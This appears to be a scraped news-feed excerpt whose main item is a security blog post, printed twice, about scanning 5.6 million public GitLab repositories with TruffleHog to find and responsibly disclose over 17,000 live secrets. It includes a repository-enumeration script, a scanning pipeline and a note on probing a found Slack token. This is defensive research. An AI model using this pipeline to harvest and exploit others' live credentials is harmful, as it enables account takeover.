    &lt;p&gt;Have a tip for CleanTechnica? Want to advertise? Want to suggest a guest for our CleanTech Talk podcast? Contact us here.&lt;/p&gt;
    &lt;p&gt;Sign up for our daily newsletter for 15 new cleantech stories a day. Or sign up for our weekly one on top stories of the week if daily is too frequent.&lt;/p&gt;
    &lt;p&gt;CleanTechnica uses affiliate links. See our policy here.&lt;/p&gt;
    &lt;p&gt;CleanTechnica's Comment Policy&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46075305</guid><pubDate>Fri, 28 Nov 2025 03:40:52 +0000</pubDate></item><item><title>Pocketbase ‚Äì open-source realtime back end in 1 file</title><link>https://pocketbase.io/</link><description>&lt;doc fingerprint="91362922a55dae74"&gt;
  &lt;main&gt;
    &lt;code&gt;// JavaScript SDK
import PocketBase from 'pocketbase';

const pb = new PocketBase('http://127.0.0.1:8090');

...

// list and search for 'example' collection records
const list = await pb.collection('example').getList(1, 100, {
    filter: 'title != "" &amp;amp;&amp;amp; created &amp;gt; "2022-08-01"',
    sort: '-created,title',
});

// or fetch a single 'example' collection record
const record = await pb.collection('example').getOne('RECORD_ID');

// delete a single 'example' collection record
await pb.collection('example').delete('RECORD_ID');

// create a new 'example' collection record
const newRecord = await pb.collection('example').create({
    title: 'Lorem ipsum dolor sit amet',
});

// subscribe to changes in any record from the 'example' collection
pb.collection('example').subscribe('*', function (e) {
    console.log(e.record);
});

// stop listening for changes in the 'example' collection
pb.collection('example').unsubscribe();&lt;/code&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46075320</guid><pubDate>Fri, 28 Nov 2025 03:45:04 +0000</pubDate></item><item><title>GitLab scan finds 17,000 secrets in public repos, leading to $9000+ in bounties</title><link>https://trufflesecurity.com/blog/scanning-5-6-million-public-gitlab-repositories-for-secrets</link><description>&lt;doc fingerprint="fe81cdda1e812f4a"&gt;
  &lt;main&gt;
    &lt;head rend="h1"&gt;Scanning 5.6 million public GitLab repositories for secrets&lt;/head&gt;
    &lt;head rend="h1"&gt;Scanning 5.6 million public GitLab repositories for secrets&lt;/head&gt;
    &lt;p&gt;Luke Marshall&lt;/p&gt;
    &lt;p&gt;November 25, 2025&lt;/p&gt;
    &lt;quote&gt;
      &lt;p&gt;TL;DR: I scanned every public GitLab Cloud repository (~5.6 million) with TruffleHog, found over 17,000 verified live secrets, and earned over $9,000 in bounties along the way.&lt;/p&gt;
    &lt;/quote&gt;
    &lt;p&gt;This guest post by Security Engineer Luke Marshall was developed through Truffle Security's Research CFP program. Luke specializes in investigating exposed secrets across open-source ecosystems, a path that led him into bug bounty work and responsible disclosure.&lt;/p&gt;
    &lt;p&gt;This is the last blog post in a two-part series exploring secrets exposed in popular Git platforms. Check out the Bitbucket research here.&lt;/p&gt;
    &lt;head rend="h3"&gt;What is GitLab?&lt;/head&gt;
    &lt;p&gt;GitLab is very similar to Bitbucket and GitHub; it is a Git-based code hosting platform launched in 2011. GitLab was the last of the 3 √¢big√¢ platforms to be released, but surprisingly holds almost twice as many public repositories as Bitbucket.&lt;/p&gt;
    &lt;p&gt;It has all the same traits as GitHub and Bitbucket that make it an attractive target for exposed credentials:&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;
        &lt;p&gt;It uses Git, which buries secrets deep in commit history.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;It hosts several million public repositories.&lt;/p&gt;
      &lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h3"&gt;Discovering all public GitLab Cloud repositories&lt;/head&gt;
    &lt;p&gt;Much like the Bitbucket research, this research aimed to provide an accurate insight into the state of exposed credentials across ALL public GitLab Cloud repositories. This meant I needed a way to list every single public GitLab Cloud repository.&lt;/p&gt;
    &lt;p&gt;GitLab exposes a public API endpoint (https://gitlab.com/api/v4/projects) that can be used to retrieve the list of repositories by sequentially paginating through results.&lt;/p&gt;
    &lt;p&gt;This script below handled this for me.&lt;/p&gt;
    &lt;code&gt;import requests
import json
import time
from pathlib import Path


TOKEN = ""
GITLAB_URL = "https://gitlab.com/api/v4"


def fetch_all_projects():
    headers = {"PRIVATE-TOKEN": TOKEN}
    output_file = Path("gitlab_projects.jsonl")
   
    page = 1
    total = 0
   
    while True:
        url = f"{GITLAB_URL}/projects"
        params = {
            "visibility": "public",
            "per_page": 100,
            "page": page,
            "order_by": "id",
            "sort": "asc"
        }
       
        response = requests.get(url, headers=headers, params=params, timeout=30)
        response.raise_for_status()
        projects = response.json()
        if not projects:
            print(f"\nComplete! Total projects: {total}")
            break
   
        with open(output_file, 'a') as f:
            for project in projects:
                f.write(json.dumps(project) + '\n')
       
        total += len(projects)
        print(f"Page {page}: +{len(projects)} projects (Total: {total})")
       
        page += 1
        time.sleep(0.03)
    print(f"\nSaved to: {output_file}")


if __name__ == "__main__":
    fetch_all_projects()

&lt;/code&gt;
    &lt;p&gt;At the time of the initial research (10/09/2025), GitLab returned over 5,600,000 repositories. Since this scan, around 100,000 new repos have been published.&lt;/p&gt;
    &lt;head rend="h3"&gt;Building the automation&lt;/head&gt;
    &lt;p&gt;I used the exact same automation as the Bitbucket research: an AWS Lambda function tied to an AWS Simple Queue Service (SQS) queue. This set me back about $770 USD, but it let me scan 5,600,000 repositories in about 24 hours.&lt;/p&gt;
    &lt;p&gt;My automation consisted of two main components:&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;
        &lt;p&gt;A local Python script that sent all 5,600,000 repository names to an AWS SQS queue, which acted as a durable task list.&lt;/p&gt;
      &lt;/item&gt;
    &lt;/list&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;
        &lt;p&gt;An AWS Lambda function to (a) scan the repositories with TruffleHog, and (b) log the results.&lt;/p&gt;
      &lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;The beauty of this architecture meant that no repository was accidentally scanned twice, and if something broke, scanning would seamlessly resume.&lt;/p&gt;
    &lt;p&gt;The scanning architecture looked like this:&lt;/p&gt;
    &lt;p&gt;AWS Lambda requires container images to embed the Lambda Runtime Interface Client (RIC) and a handler. Since the pre-built TruffleHog image is Alpine-based, it won't run as a Lambda on its own.&lt;lb/&gt;I built a custom Lambda function using an AWS Python base image (which already has the RIC and correct entrypoint), copied the TruffleHog binary into that image, and then invoked it from the handler.&lt;/p&gt;
    &lt;p&gt;My Dockerfile looked like this:&lt;/p&gt;
    &lt;code&gt;FROM public.ecr.aws/lambda/python:3.9


RUN yum update -y &amp;amp;&amp;amp; \
    yum install -y git &amp;amp;&amp;amp; \
    yum clean all &amp;amp;&amp;amp; \
    rm -rf /var/cache/yum


COPY --from=trufflesecurity/trufflehog:latest /usr/bin/trufflehog /usr/local/bin/trufflehog


WORKDIR ${LAMBDA_TASK_ROOT}


COPY requirements.txt


RUN pip install --no-cache-dir -r requirements.txt


COPY lambda_handler.python


CMD ["lambda_handler.lambda_handler"]&lt;/code&gt;
    &lt;p&gt;This is the TruffleHog command that I used:&lt;/p&gt;
    &lt;code&gt;def scan_repository(repo_url):
    repo_name = repo_url.rstrip('/').split('/')[-1]
    if repo_name.endswith('.git'):
        repo_name = repo_name[:-4]
   
    cmd = [
        'trufflehog', 'git', repo_url,
        '--json',
        '--no-update',
        '--only-verified',
        '--allow-verification-overlap',
        '--log-level=-1'
    ]&lt;/code&gt;
    &lt;p&gt;Each Lambda invocation executed a simple TruffleHog scan command with concurrency set to 1000. This setup allowed me to complete the scan of 5,600,000 repositories in just over 24 hours.&lt;/p&gt;
    &lt;head rend="h3"&gt;The Results: Comparing GitLab with Bitbucket&lt;/head&gt;
    &lt;p&gt;When comparing the two platforms, the difference in scale and findings is distinct:&lt;/p&gt;
    &lt;table&gt;
      &lt;row span="3"&gt;
        &lt;cell role="head"&gt;
          &lt;p&gt;Metric&lt;/p&gt;
        &lt;/cell&gt;
        &lt;cell role="head"&gt;
          &lt;p&gt;Bitbucket&lt;/p&gt;
        &lt;/cell&gt;
        &lt;cell role="head"&gt;
          &lt;p&gt;GitLab&lt;/p&gt;
        &lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;
          &lt;p&gt;Public Repos Scanned&lt;/p&gt;
        &lt;/cell&gt;
        &lt;cell&gt;
          &lt;p&gt;~2.6 Million&lt;/p&gt;
        &lt;/cell&gt;
        &lt;cell&gt;
          &lt;p&gt;~5.6 Million (2.1x)&lt;/p&gt;
        &lt;/cell&gt;
      &lt;/row&gt;
      &lt;row&gt;
        &lt;cell&gt;
          &lt;p&gt;Verified Secrets Found&lt;/p&gt;
        &lt;/cell&gt;
        &lt;cell&gt;
          &lt;p&gt;6,212&lt;/p&gt;
        &lt;/cell&gt;
        &lt;cell&gt;
          &lt;p&gt;17,430 (2.8x)&lt;/p&gt;
        &lt;/cell&gt;
      &lt;/row&gt;
    &lt;/table&gt;
    &lt;p&gt;While I scanned roughly twice as many repositories on GitLab, I found nearly three times as many verified secrets. This indicates a ~35% higher density of leaked secrets per repository on GitLab compared to Bitbucket.&lt;/p&gt;
    &lt;head rend="h4"&gt;Secrets Exposed by Date&lt;/head&gt;
    &lt;p&gt;The graphs below plot the frequency of live secrets exposed on GitLab Cloud and Bitbucket public repositories.&lt;/p&gt;
    &lt;p&gt;While Bitbucket√¢s exposure volume has effectively plateaued since 2018, hovering consistently in the mid-hundreds, GitLab experienced an explosive surge during the same period. This divergence suggests that the recent boom in AI development, and the associated sprawl of API keys, has disproportionately impacted GitLab√¢s more active public repository landscape.&lt;/p&gt;
    &lt;quote&gt;
      &lt;p&gt;Fun Fact: While Bitbucket has some old secrets, GitLab has some really ancient ones lingering. The earliest commit timestamp for a valid secret is 2009-12-16! These creds must have been imported into this GitLab repository, as they predate GitLab√¢s release date by almost 2 years!&lt;/p&gt;
    &lt;/quote&gt;
    &lt;head rend="h4"&gt;Secrets Exposed by Type&lt;/head&gt;
    &lt;p&gt;Like Bitbucket, Google Cloud Platform (GCP) credentials were the most leaked secret type on GitLab repositories. About 1 in 1,060 repos contained a set of valid GCP credentials!&lt;/p&gt;
    &lt;p&gt;In the graph below, I plotted the most frequently leaked keys by SaaS/Cloud providers.&lt;/p&gt;
    &lt;p&gt;A standout finding was the distribution of GitLab-specific credentials. We found 406 valid GitLab keys leaking in GitLab repositories, but only 16 GitLab keys leaking in Bitbucket. This sharp contrast, 406 vs 16, strongly supports the concept of 'platform-locality': developers are significantly more likely to commit a platform's credentials to that same platform accidentally.&lt;/p&gt;
    &lt;head rend="h4"&gt;Automating the Triage Process&lt;/head&gt;
    &lt;p&gt;The 17,430 leaked secrets belonged to 2804 unique domains, which meant I needed an efficient and accurate way to triage the results. I used an LLM capable of performing web searches (Claude Sonnet 3.7) to identify the best path to report a security vulnerability to each organization.&lt;/p&gt;
    &lt;p&gt;I split the domains into batches of 40 and then sent them to Claude along with this prompt.&lt;/p&gt;
    &lt;code&gt;I have a list of domains/organizations that I need to check for security disclosure options. For each domain below, please search and determine if they have:

- Bug Bounty Program (paid rewards via HackerOne, Bugcrowd, Intigriti, YesWeHack, etc.)
- Vulnerability Disclosure Program (VDP) - accepts reports but no payment
- Security Contact (security.txt, security@domain, or published security email)
- No Public Program - no clear way to report security issues

Please check:
- Their website's /security, /security.txt, /.well-known/security.txt pages
- Bug bounty platforms (HackerOne, Bugcrowd, Intigriti, YesWeHack, Synack)
- Their responsible disclosure policies
- Security contact information

Format the results as a table with columns:
- Domain
- Program Type (Bug Bounty/VDP/Security Contact/None)
- Platform/Contact (if applicable)
- Program URL (if available)
- Notes (scope, eligibility, etc.)&lt;/code&gt;
    &lt;p&gt;Of course, this wasn√¢t foolproof, and some organizations don√¢t have defined security programs, so I also √¢vibed√¢ up a simple Python script that would extract metadata from the TruffleHog results and dynamically generate disclosure emails. I used the role-based email addresses &lt;code&gt;security@&lt;/code&gt;, &lt;code&gt;support@&lt;/code&gt;, and &lt;code&gt;contact@&lt;/code&gt; as a best effort to reach these organizations, when I couldn√¢t find a specific email address for a security or executive contact.&lt;/p&gt;
    &lt;p&gt;Both of these systems worked well and allowed me to disclose the leaked secrets to over 120+ organizations. Separately, I directly reached out to 30+ SaaS providers to work with them directly on remediating their clients√¢ exposed credentials.&lt;/p&gt;
    &lt;head rend="h4"&gt;Looking Deeper&lt;/head&gt;
    &lt;p&gt;One of the core challenges in secret detection on Git platforms is that users committing with personal email addresses might push an organizational secret, or vice versa. Because of this, I tried to focus on relating the secret to an organization rather than just relating the committer to an organization. A good example of this was a Slack Token that was committed by a @hotmail.com address to a public GitLab repo.&lt;/p&gt;
    &lt;p&gt;For some secrets, TruffleHog outputs an Extra Data field to aid in triaging. In the case of Slack tokens, TruffleHog outputs the team value, which is often used to identify the organization using the Slack token.&lt;/p&gt;
    &lt;p&gt;To confirm my suspicions that this might be an organization√¢s token, I used TruffleHog√¢s &lt;code&gt;analyze&lt;/code&gt; feature to take a look at the secret in more detail:&lt;/p&gt;
    &lt;p&gt;Success! In the &lt;code&gt;url&lt;/code&gt; field, I found a link to a Slack instance. After navigating to this page, I saw a login screen for the org√¢s Okta instance, confirming this token was related to an organization. This secret was accepted as a P1 and paid $2100.&lt;/p&gt;
    &lt;p&gt;Note: Only run &lt;code&gt;trufflehog analyze&lt;/code&gt; on secrets that you own, or when the relevant bug bounty/disclosure program specifically authorizes that type of scanning.¬†&lt;/p&gt;
    &lt;head rend="h3"&gt;Summary&lt;/head&gt;
    &lt;p&gt;This project, paired with the earlier Bitbucket study, offers a clear view of how secrets are distributed across major Git platforms. A few key takeaways emerged:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;
        &lt;p&gt;Higher Density, Similar Payouts: While GitLab exposed far more valid credentials (3x the volume of Bitbucket), the total bounty payout was roughly the same ($9,000 vs. $10,000), suggesting that higher volume doesn't always equate to higher critical impact.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;The "Zombie Secret" Problem: Both platforms harbor valid credentials dating back over a decade (2009), proving that secrets do not simply expire on their own, they must be rotated.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Platform Locality is real: Secrets tend to leak where they live. We found nearly 25x more valid GitLab tokens on GitLab itself than we did on Bitbucket.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;The Cost of Disclosure: Responsibly disclosing secrets across 2,800+ organizations required significant automation and "triage," but it successfully led to the revocation of thousands of live keys.&lt;/p&gt;
      &lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;The bottom line is clear: even mature, enterprise platforms still harbor high-impact exposures. For defenders, this reinforces that disciplined, large-scale scanning is not just a research exercise; it is a necessity.&lt;/p&gt;
    &lt;quote&gt;
      &lt;p&gt;TL;DR: I scanned every public GitLab Cloud repository (~5.6 million) with TruffleHog, found over 17,000 verified live secrets, and earned over $9,000 in bounties along the way.&lt;/p&gt;
    &lt;/quote&gt;
    &lt;p&gt;This guest post by Security Engineer Luke Marshall was developed through Truffle Security's Research CFP program. Luke specializes in investigating exposed secrets across open-source ecosystems, a path that led him into bug bounty work and responsible disclosure.&lt;/p&gt;
    &lt;p&gt;This is the last blog post in a two-part series exploring secrets exposed in popular Git platforms. Check out the Bitbucket research here.&lt;/p&gt;
    &lt;head rend="h3"&gt;What is GitLab?&lt;/head&gt;
    &lt;p&gt;GitLab is very similar to Bitbucket and GitHub; it is a Git-based code hosting platform launched in 2011. GitLab was the last of the 3 √¢big√¢ platforms to be released, but surprisingly holds almost twice as many public repositories as Bitbucket.&lt;/p&gt;
    &lt;p&gt;It has all the same traits as GitHub and Bitbucket that make it an attractive target for exposed credentials:&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;
        &lt;p&gt;It uses Git, which buries secrets deep in commit history.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;It hosts several million public repositories.&lt;/p&gt;
      &lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h3"&gt;Discovering all public GitLab Cloud repositories&lt;/head&gt;
    &lt;p&gt;Much like the Bitbucket research, this research aimed to provide an accurate insight into the state of exposed credentials across ALL public GitLab Cloud repositories. This meant I needed a way to list every single public GitLab Cloud repository.&lt;/p&gt;
    &lt;p&gt;GitLab exposes a public API endpoint (https://gitlab.com/api/v4/projects) that can be used to retrieve the list of repositories by sequentially paginating through results.&lt;/p&gt;
    &lt;p&gt;This script below handled this for me.&lt;/p&gt;
    &lt;code&gt;import requests
import json
import time
from pathlib import Path


TOKEN = ""
GITLAB_URL = "https://gitlab.com/api/v4"


def fetch_all_projects():
    headers = {"PRIVATE-TOKEN": TOKEN}
    output_file = Path("gitlab_projects.jsonl")
   
    page = 1
    total = 0
   
    while True:
        url = f"{GITLAB_URL}/projects"
        params = {
            "visibility": "public",
            "per_page": 100,
            "page": page,
            "order_by": "id",
            "sort": "asc"
        }
       
        response = requests.get(url, headers=headers, params=params, timeout=30)
        response.raise_for_status()
        projects = response.json()
        if not projects:
            print(f"\nComplete! Total projects: {total}")
            break
   
        with open(output_file, 'a') as f:
            for project in projects:
                f.write(json.dumps(project) + '\n')
       
        total += len(projects)
        print(f"Page {page}: +{len(projects)} projects (Total: {total})")
       
        page += 1
        time.sleep(0.03)
    print(f"\nSaved to: {output_file}")


if __name__ == "__main__":
    fetch_all_projects()

&lt;/code&gt;
    &lt;p&gt;At the time of the initial research (10/09/2025), GitLab returned over 5,600,000 repositories. Since this scan, around 100,000 new repos have been published.&lt;/p&gt;
    &lt;head rend="h3"&gt;Building the automation&lt;/head&gt;
    &lt;p&gt;I used the exact same automation as the Bitbucket research: an AWS Lambda function tied to an AWS Simple Queue Service (SQS) queue. This set me back about $770 USD, but it let me scan 5,600,000 repositories in about 24 hours.&lt;/p&gt;
    &lt;p&gt;My automation consisted of two main components:&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;
        &lt;p&gt;A local Python script that sent all 5,600,000 repository names to an AWS SQS queue, which acted as a durable task list.&lt;/p&gt;
      &lt;/item&gt;
    &lt;/list&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;
        &lt;p&gt;An AWS Lambda function to (a) scan the repositories with TruffleHog, and (b) log the results.&lt;/p&gt;
      &lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;The beauty of this architecture meant that no repository was accidentally scanned twice, and if something broke, scanning would seamlessly resume.&lt;/p&gt;
    &lt;p&gt;The scanning architecture looked like this:&lt;/p&gt;
    &lt;p&gt;AWS Lambda requires container images to embed the Lambda Runtime Interface Client (RIC) and a handler. Since the pre-built TruffleHog image is Alpine-based, it won't run as a Lambda on its own.&lt;lb/&gt;I built a custom Lambda function using an AWS Python base image (which already has the RIC and correct entrypoint), copied the TruffleHog binary into that image, and then invoked it from the handler.&lt;/p&gt;
    &lt;p&gt;My Dockerfile looked like this:&lt;/p&gt;
    &lt;code&gt;FROM public.ecr.aws/lambda/python:3.9


RUN yum update -y &amp;amp;&amp;amp; \
    yum install -y git &amp;amp;&amp;amp; \
    yum clean all &amp;amp;&amp;amp; \
    rm -rf /var/cache/yum


COPY --from=trufflesecurity/trufflehog:latest /usr/bin/trufflehog /usr/local/bin/trufflehog


WORKDIR ${LAMBDA_TASK_ROOT}


COPY requirements.txt


RUN pip install --no-cache-dir -r requirements.txt


COPY lambda_handler.python


CMD ["lambda_handler.lambda_handler"]&lt;/code&gt;
    &lt;p&gt;This is the TruffleHog command that I used:&lt;/p&gt;
    &lt;code&gt;def scan_repository(repo_url):
    repo_name = repo_url.rstrip('/').split('/')[-1]
    if repo_name.endswith('.git'):
        repo_name = repo_name[:-4]
   
    cmd = [
        'trufflehog', 'git', repo_url,
        '--json',
        '--no-update',
        '--only-verified',
        '--allow-verification-overlap',
        '--log-level=-1'
    ]&lt;/code&gt;
    &lt;p&gt;Each Lambda invocation executed a simple TruffleHog scan command with concurrency set to 1000. This setup allowed me to complete the scan of 5,600,000 repositories in just over 24 hours.&lt;/p&gt;
    &lt;head rend="h3"&gt;The Results: Comparing GitLab with Bitbucket&lt;/head&gt;
    &lt;p&gt;When comparing the two platforms, the difference in scale and findings is distinct:&lt;/p&gt;
    &lt;table&gt;
      &lt;row span="3"&gt;
        &lt;cell role="head"&gt;
          &lt;p&gt;Metric&lt;/p&gt;
        &lt;/cell&gt;
        &lt;cell role="head"&gt;
          &lt;p&gt;Bitbucket&lt;/p&gt;
        &lt;/cell&gt;
        &lt;cell role="head"&gt;
          &lt;p&gt;GitLab&lt;/p&gt;
        &lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;
          &lt;p&gt;Public Repos Scanned&lt;/p&gt;
        &lt;/cell&gt;
        &lt;cell&gt;
          &lt;p&gt;~2.6 Million&lt;/p&gt;
        &lt;/cell&gt;
        &lt;cell&gt;
          &lt;p&gt;~5.6 Million (2.1x)&lt;/p&gt;
        &lt;/cell&gt;
      &lt;/row&gt;
      &lt;row&gt;
        &lt;cell&gt;
          &lt;p&gt;Verified Secrets Found&lt;/p&gt;
        &lt;/cell&gt;
        &lt;cell&gt;
          &lt;p&gt;6,212&lt;/p&gt;
        &lt;/cell&gt;
        &lt;cell&gt;
          &lt;p&gt;17,430 (2.8x)&lt;/p&gt;
        &lt;/cell&gt;
      &lt;/row&gt;
    &lt;/table&gt;
    &lt;p&gt;While I scanned roughly twice as many repositories on GitLab, I found nearly three times as many verified secrets. This indicates a ~35% higher density of leaked secrets per repository on GitLab compared to Bitbucket.&lt;/p&gt;
    &lt;head rend="h4"&gt;Secrets Exposed by Date&lt;/head&gt;
    &lt;p&gt;The graphs below plot the frequency of live secrets exposed on GitLab Cloud and Bitbucket public repositories.&lt;/p&gt;
    &lt;p&gt;While Bitbucket√¢s exposure volume has effectively plateaued since 2018, hovering consistently in the mid-hundreds, GitLab experienced an explosive surge during the same period. This divergence suggests that the recent boom in AI development, and the associated sprawl of API keys, has disproportionately impacted GitLab√¢s more active public repository landscape.&lt;/p&gt;
    &lt;quote&gt;
      &lt;p&gt;Fun Fact: While Bitbucket has some old secrets, GitLab has some really ancient ones lingering. The earliest commit timestamp for a valid secret is 2009-12-16! These creds must have been imported into this GitLab repository, as they predate GitLab√¢s release date by almost 2 years!&lt;/p&gt;
    &lt;/quote&gt;
    &lt;head rend="h4"&gt;Secrets Exposed by Type&lt;/head&gt;
    &lt;p&gt;Like Bitbucket, Google Cloud Platform (GCP) credentials were the most leaked secret type on GitLab repositories. About 1 in 1,060 repos contained a set of valid GCP credentials!&lt;/p&gt;
    &lt;p&gt;In the graph below, I plotted the most frequently leaked keys by SaaS/Cloud providers.&lt;/p&gt;
    &lt;p&gt;A standout finding was the distribution of GitLab-specific credentials. We found 406 valid GitLab keys leaking in GitLab repositories, but only 16 GitLab keys leaking in Bitbucket. This sharp contrast, 406 vs 16, strongly supports the concept of 'platform-locality': developers are significantly more likely to commit a platform's credentials to that same platform accidentally.&lt;/p&gt;
    &lt;head rend="h4"&gt;Automating the Triage Process&lt;/head&gt;
    &lt;p&gt;The 17,430 leaked secrets belonged to 2804 unique domains, which meant I needed an efficient and accurate way to triage the results. I used an LLM capable of performing web searches (Claude Sonnet 3.7) to identify the best path to report a security vulnerability to each organization.&lt;/p&gt;
    &lt;p&gt;I split the domains into batches of 40 and then sent them to Claude along with this prompt.&lt;/p&gt;
    &lt;code&gt;I have a list of domains/organizations that I need to check for security disclosure options. For each domain below, please search and determine if they have:

- Bug Bounty Program (paid rewards via HackerOne, Bugcrowd, Intigriti, YesWeHack, etc.)
- Vulnerability Disclosure Program (VDP) - accepts reports but no payment
- Security Contact (security.txt, security@domain, or published security email)
- No Public Program - no clear way to report security issues

Please check:
- Their website's /security, /security.txt, /.well-known/security.txt pages
- Bug bounty platforms (HackerOne, Bugcrowd, Intigriti, YesWeHack, Synack)
- Their responsible disclosure policies
- Security contact information

Format the results as a table with columns:
- Domain
- Program Type (Bug Bounty/VDP/Security Contact/None)
- Platform/Contact (if applicable)
- Program URL (if available)
- Notes (scope, eligibility, etc.)&lt;/code&gt;
    &lt;p&gt;Of course, this wasn√¢t foolproof, and some organizations don√¢t have defined security programs, so I also √¢vibed√¢ up a simple Python script that would extract metadata from the TruffleHog results and dynamically generate disclosure emails. I used the role-based email addresses &lt;code&gt;security@&lt;/code&gt;, &lt;code&gt;support@&lt;/code&gt;, and &lt;code&gt;contact@&lt;/code&gt; as a best effort to reach these organizations, when I couldn√¢t find a specific email address for a security or executive contact.&lt;/p&gt;
    &lt;p&gt;Both of these systems worked well and allowed me to disclose the leaked secrets to over 120+ organizations. Separately, I directly reached out to 30+ SaaS providers to work with them directly on remediating their clients√¢ exposed credentials.&lt;/p&gt;
    &lt;head rend="h4"&gt;Looking Deeper&lt;/head&gt;
    &lt;p&gt;One of the core challenges in secret detection on Git platforms is that users committing with personal email addresses might push an organizational secret, or vice versa. Because of this, I tried to focus on relating the secret to an organization rather than just relating the committer to an organization. A good example of this was a Slack Token that was committed by a @hotmail.com address to a public GitLab repo.&lt;/p&gt;
    &lt;p&gt;For some secrets, TruffleHog outputs an Extra Data field to aid in triaging. In the case of Slack tokens, TruffleHog outputs the team value, which is often used to identify the organization using the Slack token.&lt;/p&gt;
    &lt;p&gt;To confirm my suspicions that this might be an organization√¢s token, I used TruffleHog√¢s &lt;code&gt;analyze&lt;/code&gt; feature to take a look at the secret in more detail:&lt;/p&gt;
    &lt;p&gt;Success! In the &lt;code&gt;url&lt;/code&gt; field, I found a link to a Slack instance. After navigating to this page, I saw a login screen for the org√¢s Okta instance, confirming this token was related to an organization. This secret was accepted as a P1 and paid $2100.&lt;/p&gt;
    &lt;p&gt;Note: Only run &lt;code&gt;trufflehog analyze&lt;/code&gt; on secrets that you own, or when the relevant bug bounty/disclosure program specifically authorizes that type of scanning.¬†&lt;/p&gt;
    &lt;head rend="h3"&gt;Summary&lt;/head&gt;
    &lt;p&gt;This project, paired with the earlier Bitbucket study, offers a clear view of how secrets are distributed across major Git platforms. A few key takeaways emerged:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;
        &lt;p&gt;Higher Density, Similar Payouts: While GitLab exposed far more valid credentials (3x the volume of Bitbucket), the total bounty payout was roughly the same ($9,000 vs. $10,000), suggesting that higher volume doesn't always equate to higher critical impact.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;The "Zombie Secret" Problem: Both platforms harbor valid credentials dating back over a decade (2009), proving that secrets do not simply expire on their own, they must be rotated.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Platform Locality is real: Secrets tend to leak where they live. We found nearly 25x more valid GitLab tokens on GitLab itself than we did on Bitbucket.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;The Cost of Disclosure: Responsibly disclosing secrets across 2,800+ organizations required significant automation and "triage," but it successfully led to the revocation of thousands of live keys.&lt;/p&gt;
      &lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;The bottom line is clear: even mature, enterprise platforms still harbor high-impact exposures. For defenders, this reinforces that disciplined, large-scale scanning is not just a research exercise; it is a necessity.&lt;/p&gt;
    &lt;p&gt;Thoughts, research findings, reports, and more from Truffle Security Co.&lt;/p&gt;
    &lt;head rend="h1"&gt;The Dig&lt;/head&gt;
    &lt;p&gt;Thoughts, research findings, reports, and more from Truffle Security Co.&lt;/p&gt;
    &lt;p&gt;STAY STRONG&lt;/p&gt;
    &lt;p&gt;DIG DEEP&lt;/p&gt;
    &lt;p&gt;DOING IT THE RIGHT WAY&lt;/p&gt;
    &lt;p&gt;√Ç¬© 2025 Truffle Security Co.&lt;/p&gt;
    &lt;p&gt;STAY STRONG&lt;/p&gt;
    &lt;p&gt;DIG DEEP&lt;/p&gt;
    &lt;p&gt;√Ç¬© 2025 Truffle Security Co.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46075367</guid><pubDate>Fri, 28 Nov 2025 03:55:37 +0000</pubDate></item><item><title>Migrating to Positron, a next-generation data science IDE for Python and R</title><link>https://posit.co/blog/positron-migration-guides</link><description>&lt;doc fingerprint="8daf6973e9b8e2c9"&gt;
  &lt;main&gt;
    &lt;head rend="h1"&gt;Guides for migrating to Positron&lt;/head&gt;
    &lt;p&gt;Since Positron was released from beta, we‚Äôve been working hard to create documentation that could help you, whether you are curious about the IDE or interested in switching. We‚Äôve released two migration guides to help you on your journey, which you can find linked below.&lt;/p&gt;
    &lt;head rend="h2"&gt;Migrating to Positron from VS Code&lt;/head&gt;
    &lt;p&gt;Positron is a next-generation IDE for data science, built by Posit PBC. It‚Äôs built on Code OSS, the open-source core of Visual Studio Code, which means that many of the features and keyboard shortcuts you‚Äôre familiar with are already in place.&lt;/p&gt;
    &lt;p&gt;However, Positron is specifically designed for data work and includes integrated tools that aren‚Äôt available in VS Code by default. These include:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;A built-in data explorer: This feature gives you a spreadsheet-style view of your dataframes, making it easy to inspect, sort, and filter data.&lt;/item&gt;
      &lt;item&gt;An interactive console and variables pane: Positron lets you execute code interactively and view the variables and objects in your session, similar to a traditional data science IDE.&lt;/item&gt;
      &lt;item&gt;AI assistance: Positron Assistant is a powerful AI tool for data science that can generate and refine code, debug issues, and guide you through exploratory data analysis.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;See the VS Code migration guide here.&lt;/p&gt;
    &lt;head rend="h2"&gt;Migrating to Positron from RStudio&lt;/head&gt;
